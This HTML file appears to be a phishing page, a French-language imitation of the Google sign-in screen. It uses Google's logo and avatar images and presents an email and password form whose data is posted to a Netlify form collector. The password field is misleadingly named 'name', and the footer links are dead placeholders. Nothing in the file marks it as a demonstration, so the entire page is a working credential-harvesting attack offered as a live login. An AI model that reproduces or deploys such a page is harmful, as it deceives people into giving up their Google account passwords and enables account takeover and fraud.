<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <link type="text/css" rel="stylesheet" href="login_style.css">
    <title>Se connecter avec Google</title>
    <link
        href='https://fonts.googleapis.com/css?family=Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic'
        rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="67060-play-photos-search-google-account-png-file-hd.ico" />

</head>

<body>
    <div class="logo" style="margin-top:100px;">
        <img src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png">
    </div>
    <p style="font-family:'Product Sans Regular';font-weight:normal;font-size:32px; ">Connectez vous avec Google
    </p>
    <div class="login" style="margin-top: 10px; height:355px;">
        <br><br>
        <div>
            <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
        </div>
        <br>
        <form name="contact" method="POST" data-netlify="true">
            <div class="field">
                <input class="inaa" type="email" name="email" id="email" placeholder="Email">
            </div>

            <div class="field">

                <input class="inaa ma" type="password" name="name" id="name" placeholder="Votre mot de passe">
            </div>
            <br><br>
            <button type="submit" class="ok" value="Send Message">
                <div class="button mal">
                    <p>Se connecter</p>
                </div>
            </button>
        </form>

        <a href="#">
        </a>
    </div>
    <p style="text-align: center;">Découvrez tous nos services.</p>
    <div class="logo-strip">
        <img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png">
    </div>
    <div class="bottom">
        <br>
        <a href="#">A propos</a>
        <a href="#">Confidentialité</a>
        <a href="#">Activité</a>
        <a href="#">Paramètes</a>
    </div>
    <style>
        .mal {
            background: #1a73e8 !important;
            display: flex;
            justify-content: center;
            align-items: center
        }

        .ok {
            text-decoration: none !important;
            margin-bottom: 25px !important;
            background: #1a73e800;
            border: 0;
            cursor: pointer;
            margin-left: -7px;
        }
    </style>
</body>

</html>
